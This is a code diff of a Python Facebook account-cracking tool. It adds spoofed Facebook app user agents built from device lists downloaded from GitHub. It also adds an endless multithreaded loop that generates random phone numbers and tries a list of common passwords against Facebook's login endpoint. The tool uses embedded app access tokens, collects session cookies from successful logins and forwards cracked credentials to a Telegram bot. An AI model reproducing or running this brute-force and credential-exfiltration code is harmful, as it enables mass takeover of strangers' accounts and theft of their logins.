@@ -16,8 +16,6 @@ from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from urllib.parse import quote
 import requests
-import pycurl
-from io import BytesIO
 
 # --------------------- INTERNET CHECK --------------------- #
 try:
@@ -44,8 +42,8 @@ except ImportError as e:
         pass
 
 # --------------------- COLORS --------------------- #
-G = "\033[1;34m"  # بدل الأخضر إلى أزرق
-R = "\033[1;34m"  # بدل الأحمر إلى أزرق
+G = "\033[1;34m"
+R = "\033[1;34m"
 W = "\x1b[38;5;15m"
 B = "\033[1;34m"
 Y = "\x1b[38;5;226m"
@@ -98,7 +96,7 @@ logo = f"""
 {xp} TODAYS   {xpxx} {datetime.now().strftime('%Y-%m-%d')}
 {xlinex}"""
 
-# --------------------- DATE (for first tool) --------------------- #
+# --------------------- DATE --------------------- #
 __dic__ = {
     '1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL',
     '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST',
@@ -113,15 +111,130 @@ ltx = int(lt()[3])
 a = ltx - 12 if ltx > 12 else ltx
 tag = "PM" if ltx > 12 else "AM"
 
-# --------------------- SDCARD PERMISSION (optional) --------------------- #
+# --------------------- SDCARD PERMISSION --------------------- #
 try:
     system("clear" if os.name == "posix" else "cls")
+    os.makedirs("/sdcard/PS-/MODELS/", exist_ok=True)
     with open("/sdcard/.txt", "w") as f:
         f.write(" ")
 except (PermissionError, IOError):
     pass
 
-# --------------------- TELEGRAM FUNCTION (shared) --------------------- #
+# --------------------- GLOBAL VARIABLES FOR MODELS --------------------- #
+ANDROID_MODELS = []
+USER_AGENTS_LIST = []
+MODELS_LOADED = False
+
+# --------------------- DOWNLOAD MODELS FUNCTION --------------------- #
+def download_models():
+    global ANDROID_MODELS, USER_AGENTS_LIST, MODELS_LOADED
+    
+    model_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/model.txt"
+    ua_url = "https://github.com/pubgcvb780-pixel/welcome-audio/raw/refs/heads/main/user_agant.txt"
+    
+    model_path = "/sdcard/PS-/MODELS/model.txt"
+    ua_path = "/sdcard/PS-/MODELS/user_agant.txt"
+    
+    # تحميل ملف الموديلات
+    if os.path.exists(model_path):
+        try:
+            with open(model_path, 'r') as f:
+                ANDROID_MODELS = [line.strip() for line in f.readlines() if line.strip()]
+            print(f"{xp} MODELS LOADED FROM LOCAL: {len(ANDROID_MODELS)} models")
+        except:
+            pass
+    else:
+        try:
+            print(f"{xp} DOWNLOADING MODELS FROM GITHUB...")
+            response = requests.get(model_url, timeout=15)
+            if response.status_code == 200:
+                ANDROID_MODELS = [line.strip() for line in response.text.splitlines() if line.strip()]
+                with open(model_path, 'w') as f:
+                    f.write(response.text)
+                print(f"{xp} MODELS DOWNLOADED: {len(ANDROID_MODELS)} models")
+            else:
+                print(f"{xp} FAILED TO DOWNLOAD MODELS, USING DEFAULT")
+        except:
+            print(f"{xp} ERROR DOWNLOADING MODELS, USING DEFAULT")
+    
+    # تحميل ملف User-Agent
+    if os.path.exists(ua_path):
+        try:
+            with open(ua_path, 'r') as f:
+                USER_AGENTS_LIST = [line.strip() for line in f.readlines() if line.strip()]
+            print(f"{xp} USER-AGENTS LOADED FROM LOCAL: {len(USER_AGENTS_LIST)} UAs")
+        except:
+            pass
+    else:
+        try:
+            print(f"{xp} DOWNLOADING USER-AGENTS FROM GITHUB...")
+            response = requests.get(ua_url, timeout=15)
+            if response.status_code == 200:
+                USER_AGENTS_LIST = [line.strip() for line in response.text.splitlines() if line.strip()]
+                with open(ua_path, 'w') as f:
+                    f.write(response.text)
+                print(f"{xp} USER-AGENTS DOWNLOADED: {len(USER_AGENTS_LIST)} UAs")
+            else:
+                print(f"{xp} FAILED TO DOWNLOAD USER-AGENTS, USING DEFAULT")
+        except:
+            print(f"{xp} ERROR DOWNLOADING USER-AGENTS, USING DEFAULT")
+    
+    MODELS_LOADED = True
+
+# --------------------- UA FUNCTION WITH MODELS --------------------- #
+def UA():
+    global ANDROID_MODELS
+    
+    if ANDROID_MODELS:
+        fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
+        fbbv3 = str(random.randint(111111111, 999999999))
+        density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
+        width3 = random.choice(['720', '1080'])
+        height3 = random.choice(['2400', '2340', '2560'])
+        fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
+        fbrv3 = str(random.randint(333333333, 999999999))
+        fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint"])
+        fbmf3 = random.choice(['samsung', 'xiaomi', 'huawei', 'oppo', 'vivo'])
+        fbbd3 = fbmf3
+        fbdv3 = random.choice(ANDROID_MODELS)
+        fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
+        fb3 = random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
+        fban3 = fb3.split('|')[1]
+        fbpn3 = fb3.split('|')[0]
+        bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
+        
+        ua = f'[FBAN/{fban3};FBAV/{fbav3};FBBV/{fbbv3};FBDM/{{density={density3},width={width3},height={height3}}};FBLC/{fblc3};FBRV/{fbrv3};FBCR/{fbcr3};FBMF/{fbmf3};FBBD/{fbbd3};FBPN/{fbpn3};FBDV/{fbdv3};FBSV/{fbsv3};{bit3}'
+        return ua
+    else:
+        # Fallback للكود الأصلي
+        fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
+        fbbv3 = str(random.randint(111111111, 999999999))
+        density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
+        width3 = random.choice(['720', '1080'])
+        height3 = random.choice(['2400', '2340', '2560'])
+        fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
+        fbrv3 = str(random.randint(333333333, 999999999))
+        fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
+        fbmf3 = 'samsung'
+        fbbd3 = 'samsung'
+        fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
+        fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
+        fb3 = random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
+        fban3 = fb3.split('|')[1]
+        fbpn3 = fb3.split('|')[0]
+        bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
+        
+        ua = f'[FBAN/{fban3};FBAV/{fbav3};FBBV/{fbbv3};FBDM/{{density={density3},width={width3},height={height3}}};FBLC/{fblc3};FBRV/{fbrv3};FBCR/{fbcr3};FBMF/{fbmf3};FBBD/{fbbd3};FBPN/{fbpn3};FBDV/{fbdv3};FBSV/{fbsv3};{bit3}'
+        return ua
+
+# --------------------- GET RANDOM USER-AGENT FROM LIST --------------------- #
+def get_random_ua_from_list():
+    global USER_AGENTS_LIST
+    if USER_AGENTS_LIST:
+        return random.choice(USER_AGENTS_LIST)
+    return UA()
+
+# --------------------- TELEGRAM FUNCTION --------------------- #
 def send_telegram_message(bot_token, chat_id, message):
     if not bot_token or not chat_id:
         return
@@ -135,31 +248,6 @@ def send_telegram_message(bot_token, chat_id, message):
         requests.post(url, json=payload, timeout=5)
     except:
         pass
-
-# --------------------- PYCURL POST FUNCTION --------------------- #
-def pycurl_post(url, data, headers, timeout=15):
-    try:
-        buffer = BytesIO()
-        c = pycurl.Curl()
-        c.setopt(pycurl.URL, url)
-        c.setopt(pycurl.POST, 1)
-        c.setopt(pycurl.POSTFIELDS, data)
-        c.setopt(pycurl.WRITEDATA, buffer)
-        c.setopt(pycurl.TIMEOUT, timeout)
-        c.setopt(pycurl.SSL_VERIFYPEER, 0)
-        c.setopt(pycurl.SSL_VERIFYHOST, 0)
-        
-        # Set headers
-        header_list = [f"{k}: {v}" for k, v in headers.items()]
-        c.setopt(pycurl.HTTPHEADER, header_list)
-        
-        c.perform()
-        response = buffer.getvalue().decode('utf-8')
-        c.close()
-        
-        return json.loads(response)
-    except Exception as e:
-        return {}
 
 # ==================== TOOL 1: FILE CLONING ==================== #
 TELEGRAM_BOT_TOKEN = ""
@@ -187,24 +275,6 @@ def __CLEAR__():
 def __LINE__():
     print(f"{R}━"*56)
 
-def UA():
-    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
-    fbbv3 = str(random.randint(111111111, 999999999))
-    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
-    width3 = random.choice(['720', '1080'])
-    height3 = random.choice(['2400', '2340', '2560'])
-    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-    fbrv3 = str(random.randint(333333333, 999999999))
-    fbcr3 = random.choice(["Banglalink", "Airtel", "Robi", "Grameenphone", "Teletalk", "U.S. Cellular", "Verizon", "Verizon Wireless", "Cricket", "Google Fi", "T-Mobile", "AT&T", "Sprint","Metro by T-Mobile","Boost Mobile","TracFone Wireless","Xfinity Mobile","Mint Mobile","Visible","Republic Wireless","Consumer Cellular","Straight Talk","Spectrum Mobile","Ting","H2O Wireless","FreedomPop","Boost Infinite","Simple Mobile","Pure Talk","C-Spire Wireless","SouthernLINC Wireless","GCI Wireless","Bluegrass Cellular","Nex-Tech Wireless","T-Mobile Prepaid","Ultra Mobile","TracFone","Freedom Wireless","MetroPCS","Cellcom","Nextel","Cricket Wireless"])
-    fbmf3 = 'samsung';fbbd3 = 'samsung'
-    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
-    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
-    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
-    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
-    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
-    ___Noor_on_Fire___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
-    return ___Noor_on_Fire___
-
 class __PSJO__:
     def __init__(self) -> None:
         self.loop = 0
@@ -225,17 +295,14 @@ class __PSJO__:
             get_telegram_credentials()
         __CLEAR__()
         print(f"{xp1} FILE CLONING ")
-        print(f"{xp2} RANDOM CLONING{R} ({W}SOON{R}) ")
+        print(f"{xp2} RANDOM CLONING")
         print(f"{xp0} EXIT TOOLS ")
         __LINE__()
         __MENUC__ = input(f"{xpx} INPUT MENU {xpxx} ")
         if __MENUC__ == "1":
             self.__FILEX__()
         elif __MENUC__ == "2":
-            __LINE__()
-            print(f"{xp} RANDOM CLONE COMING SOON...! ")
-            time.sleep(1.1)
-            self.__MENU__()
+            random_clone_menu()
         elif __MENUC__ == "0":
             __LINE__()
             print(f"{xp} EXIT SUCCESSFULLY ")
@@ -411,7 +478,7 @@ class __PSJO__:
 
             for pw in passlist:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                ua = UA()
+                ua = get_random_ua_from_list()
                 accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32', '256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                 random_seed = random.Random()
                 pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
@@ -438,8 +505,7 @@ class __PSJO__:
                 twf = "Login approval's are on"
 
                 try:
-                    data_encoded = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
-                    po = pycurl_post(url, data_encoded, headers, timeout=15)
+                    po = requests.post(url, data=data, headers=headers, timeout=15).json()
                     self.successful_attempts += 1
                     if 'session_key' in po:
                         ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
@@ -485,7 +551,7 @@ class __PSJO__:
 
             for pw in passlist:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                ua = UA()
+                ua = get_random_ua_from_list()
                 accessToken = random.choice(['350685531728|62f8ce9f74b12f84c123cc23437a4a32', '256002347743983|374e60f8b9bb6b8cbb30f78030438895'])
                 random_seed = random.Random()
                 pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
@@ -512,8 +578,7 @@ class __PSJO__:
                 twf = "Login approval's are on"
 
                 try:
-                    data_encoded = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
-                    po = pycurl_post(url, data_encoded, headers, timeout=15)
+                    po = requests.post(url, data=data, headers=headers, timeout=15).json()
                     self.successful_attempts += 1
                     if 'session_key' in po:
                         ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
@@ -559,7 +624,7 @@ class __PSJO__:
 
             for pw in passlist:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                ua = UA()
+                ua = get_random_ua_from_list()
                 accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                 random_seed = random.Random()
                 pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
@@ -586,8 +651,7 @@ class __PSJO__:
                 twf = "Login approval's are on"
 
                 try:
-                    data_encoded = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
-                    po = pycurl_post(url, data_encoded, headers, timeout=15)
+                    po = requests.post(url, data=data, headers=headers, timeout=15).json()
                     self.successful_attempts += 1
                     if 'session_key' in po:
                         ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
@@ -633,7 +697,7 @@ class __PSJO__:
 
             for pw in passlist:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                ua = UA()
+                ua = get_random_ua_from_list()
                 accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                 random_seed = random.Random()
                 pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
@@ -660,8 +724,7 @@ class __PSJO__:
                 twf = "Login approval's are on"
 
                 try:
-                    data_encoded = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
-                    po = pycurl_post(url, data_encoded, headers, timeout=15)
+                    po = requests.post(url, data=data, headers=headers, timeout=15).json()
                     self.successful_attempts += 1
                     if 'session_key' in po:
                         ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
@@ -695,10 +758,9 @@ class __PSJO__:
         except:
             pass
 
-# ==================== TOOL 2: RANDOM CLONING ==================== #
+# ==================== TOOL 2: RANDOM CLONING (MODIFIED - INFINITE LOOP) ==================== #
 def random_clone_menu():
-    # local variables to avoid conflict
-    id_list = []
+    # local variables
     ok = 0
     loop = 0
 
@@ -725,45 +787,6 @@ def random_clone_menu():
         "20": {"name": "Somalia", "codes": ["060", "061", "062", "063", "064", "065"]},
         "21": {"name": "Djibouti", "codes": ["770", "771", "772", "773", "774", "775"]},
         "22": {"name": "Comoros", "codes": ["320", "321", "322", "323", "324", "325"]}
-    }
-
-    android_versions = ["10", "11", "12", "13", "14"]
-    devices = [
-        "TECNO CK7n",
-        "Samsung SM-G991B",
-        "Xiaomi Redmi Note 12",
-        "Infinix X6812",
-        "Huawei Y9a"
-    ]
-    brands = {
-        "TECNO CK7n": "TECNO",
-        "Samsung SM-G991B": "Samsung",
-        "Xiaomi Redmi Note 12": "Xiaomi",
-        "Infinix X6812": "Infinix",
-        "Huawei Y9a": "Huawei"
-    }
-
-    def get_random_ua():
-        android = random.choice(android_versions)
-        device = random.choice(devices)
-        brand = brands[device]
-        fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
-        fbbv = random.randint(100000000,999999999)
-        width = random.choice([720, 1080, 1440])
-        height = random.choice([1600, 1920, 2172, 2400])
-        density = random.choice([2.0, 2.5, 3.0, 4.0])
-        
-        ua = f"""Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"""
-        return ua
-
-    headers = {
-        "Accept-Encoding": "gzip, deflate",
-        "x-fb-connection-quality": "EXCELLENT",
-        "x-fb-friendly-name": "authenticate",
-        "x-fb-http-engine": "Liger",
-        "x-fb-client-ip": "True",
-        "x-fb-server-cluster": "True",
-        "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
     }
 
     def show_countries_menu():
@@ -847,10 +870,9 @@ def random_clone_menu():
     def get_cookies(uid, password):
         try:
             temp_headers = headers.copy()
-            temp_headers["User-Agent"] = get_random_ua()
+            temp_headers["User-Agent"] = get_random_ua_from_list()
             data = pm(uid, password)
-            data_encoded = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
-            req = pycurl_post('https://b-graph.facebook.com/auth/login', data_encoded, temp_headers, timeout=10)
+            req = requests.post('https://b-graph.facebook.com/auth/login', headers=temp_headers, data=data, timeout=10).json()
             if 'session_key' in req:
                 cookies = ";".join([f"{key}={value}" for key, value in req.get('session_cookies', [{}])[0].items()])
                 return cookies
@@ -866,10 +888,9 @@ def random_clone_menu():
         for pw in pwxs:
             try:
                 temp_headers = headers.copy()
-                temp_headers["User-Agent"] = get_random_ua()
+                temp_headers["User-Agent"] = get_random_ua_from_list()
                 data = pm(ids, pw)
-                data_encoded = "&".join([f"{k}={quote(str(v))}" for k, v in data.items()])
-                req = pycurl_post('https://b-graph.facebook.com/auth/login', data_encoded, temp_headers, timeout=8)
+                req = requests.post('https://b-graph.facebook.com/auth/login', headers=temp_headers, data=data, timeout=8).json()
                 
                 if 'session_key' in req:
                     uid = req["uid"]
@@ -903,6 +924,17 @@ PASSWORD : {pw}"""
         
         loop += 1
 
+    # Headers
+    headers = {
+        "Accept-Encoding": "gzip, deflate",
+        "x-fb-connection-quality": "EXCELLENT",
+        "x-fb-friendly-name": "authenticate",
+        "x-fb-http-engine": "Liger",
+        "x-fb-client-ip": "True",
+        "x-fb-server-cluster": "True",
+        "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+    }
+
     # Main logic for random clone
     __CLEAR__()
     print(logo)
@@ -913,7 +945,7 @@ PASSWORD : {pw}"""
     ID = input(f'{xp} ID {xpxx} ').strip()
     print(xlinex)
     
-    # Set global Telegram credentials for random clone as well
+    # Set global Telegram credentials
     global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID
     TELEGRAM_BOT_TOKEN = TOKEN
     TELEGRAM_CHAT_ID = ID
@@ -921,53 +953,56 @@ PASSWORD : {pw}"""
     selected_code = select_code()
     print(xlinex)
     print(f"{xp} Starting attack on code: {R}{selected_code}{W}")
+    print(f"{xp} Press Ctrl+C to stop")
     print(xlinex)
-    
-    # Generate numbers
-    id_list.clear()
-    for _ in range(100):  # change to 44444 for full
-        nmp = "".join(random.choice('1234567890') for ing in range(7))
-        id_list.append(nmp)
     
     __CLEAR__()
     print(xlinex)
     print(f"{xp} Attacking: {R}{selected_code}XXXXXXXXX{W}")
     print(xlinex)
     print(f"{xp} Status: {R}Running...{W}")
+    print(f"{xp} Press Ctrl+C to stop")
     print(xlinex)
     
+    pwxs = [
+        "123456789", "12345678", "1234567", "password", "pass1234",
+        "qwerty123", "facebook123", "fb123456", "19801980", "19811981",
+        "19821982", "19831983", "19841984", "19851985", "19861986",
+        "19871987", "19881988", "19891989", "19901990", "19911991",
+        "19921992", "19931993", "19941994", "19951995", "19961996",
+        "19971997", "19981998", "19991999", "20002000", "20012001",
+        "20022002", "20032003", "20042004", "20052005", "20062006",
+        "20072007", "20082008", "20092009", "20102010", "20112011",
+        "20122012", "20132013", "20142014", "20152015", "20162016",
+        "20172017", "20182018", "20192019", "20202020", "20212021",
+        "20222022", "20232023", "20242024", "20252025", "20262026",
+        "07800780", "07700770", "07500750", "12344321", "12341234",
+        "123456", "1234567", "11111234", "@1234@", "@123456@",
+        "@1234567@", "@12345678@", "@@@@1111", "1111@@@@", "@@@@####"
+    ]
+    
+    # INFINITE LOOP -将持续运行直到用户按Ctrl+C
     with ThreadPool(max_workers=50) as am:
-        for idx in id_list:
-            ids = selected_code + str(idx)
-            pwxs = [
-                ids, str(idx), "hama1234", "zaxo1234", "zaxozaxo",
-                "kurd1234", "muhamad123", "kurdkurd", "123456789",
-                "12345678", "1234567", "password", "pass1234",
-                "qwerty123", "facebook123", "fb123456", ids[:8], ids[-8:],
-                "19801980", "19811981", "19821982", "19831983", "19841984",
-                "19851985", "19861986", "19871987", "19881988", "19891989",
-                "19901990", "19911991", "19921992", "19931993", "19941994",
-                "19951995", "19961996", "19971997", "19981998", "19991999",
-                "20002000", "20012001", "20022002", "20032003", "20042004",
-                "20052005", "20062006", "20072007", "20082008", "20092009",
-                "20102010", "20112011", "20122012", "20132013", "20142014",
-                "20152015", "20162016", "20172017", "20182018", "20192019",
-                "20202020", "20212021", "20222022", "20232023", "20242024",
-                "20252025", "20262026", "07800780", "07700770", "07500750",
-                "12344321", "12341234", "12345678", "123456", "1234567",
-                "11111234", "@1234@", "@123456@", "@1234567@", "@12345678@",
-                "@@@@1111", "1111@@@@", "@@@@####"
-            ]
-            am.submit(crackfree, ids, pwxs)
-    
-    print('')
-    print(xlinex)
-    print('Crack Completed')
-    input(f"{xp} Press Enter to return to main menu...")
-    return
+        try:
+            while True:
+                # توليد رقم عشوائي مكون من 7 أرقام
+                nmp = "".join(random.choice('1234567890') for _ in range(7))
+                ids = selected_code + nmp
+                am.submit(crackfree, ids, pwxs)
+                time.sleep(0.05)  # تأخير بسيط لمنع الإفراط
+        except KeyboardInterrupt:
+            print(f"\n{xp} Stopped by user")
+            print(xlinex)
+            print(f"{xp} Total OK: {ok}")
+            print(f"{xp} Total attempts: {loop}")
+            input(f"{xp} Press Enter to return to main menu...")
+            return
 
 # ==================== MAIN MENU ==================== #
 def main_menu():
+    # تحميل الموديلات عند بدء التشغيل
+    download_models()
+    
     while True:
         __CLEAR__()
         print(f"{xp1} From the ID File  ")
